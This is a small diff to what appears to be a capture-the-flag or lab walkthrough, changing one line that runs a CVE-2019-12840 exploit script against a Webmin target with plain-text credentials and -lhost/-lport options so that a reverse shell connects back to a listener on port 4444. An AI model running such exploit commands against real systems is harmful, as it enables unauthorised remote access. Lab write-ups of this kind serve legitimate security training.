@@ -103,7 +103,7 @@ We can either use the script to inject commands or we can set the ``-lhost`` and
 
 ![img](assets/listner.png)
 
-Once our listener is started, we just need to run the script as instructed with ``python CVE-2019-12840 -u https://[target IP]:10000 -U Matt -P computer2008 -lhost [your IP] -lport 4444`` to gain access. 
+Once our listener is started, we just need to run the script as instructed with ``python CVE-2019-12840 -u https://[target IP] -U Matt -P computer2008 -lhost [your IP] -lport 4444`` to gain access. 
 
 ![img](assets/script.png)
 
